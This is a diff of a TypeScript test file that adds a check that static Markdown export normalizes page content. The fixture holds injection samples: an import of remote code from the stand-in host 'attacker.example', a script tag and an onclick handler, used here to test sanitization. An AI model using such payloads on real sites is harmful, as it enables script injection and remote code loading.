@@ -1,3 +1,4 @@
+import { normalizePublicMarkdownContent } from '@nibleaf/shared/public-markdown-content';
 import type { SiteSnapshot } from '@nibleaf/shared/site';
 import { THEME_PRESET_IDS } from '@nibleaf/shared/themes';
 import { unzipSync } from 'fflate';
@@ -88,6 +89,15 @@ const required = <T>(value: T | undefined): T => {
 };
 
 describe('export renderers', () => {
+  it('uses the shared live/static Markdown normalization contract', () => {
+    const content =
+      'import Exploit from "https://attacker.example/exploit.js"\n\n<Callout>**Portable**</Callout>\n\n<script>run()</script>\n\n<Raw onclick="run()">text</Raw>';
+    const page = { ...required(snapshot.pages[0]), content };
+    const files = unzipSync(renderStaticHtml({ ...snapshot, pages: [page] }, assets).bytes);
+
+    expect(text(required(files['main/ar/intro/index.md']))).toBe(`# مقدمة\n\n${normalizePublicMarkdownContent(content)}\n`);
+  });
+
   it('rewrites internal links and allowlisted assets for offline static output', () => {
     const files = unzipSync(renderStaticHtml(snapshot, assets).bytes);
     const intro = text(required(files['main/ar/intro/index.html']));
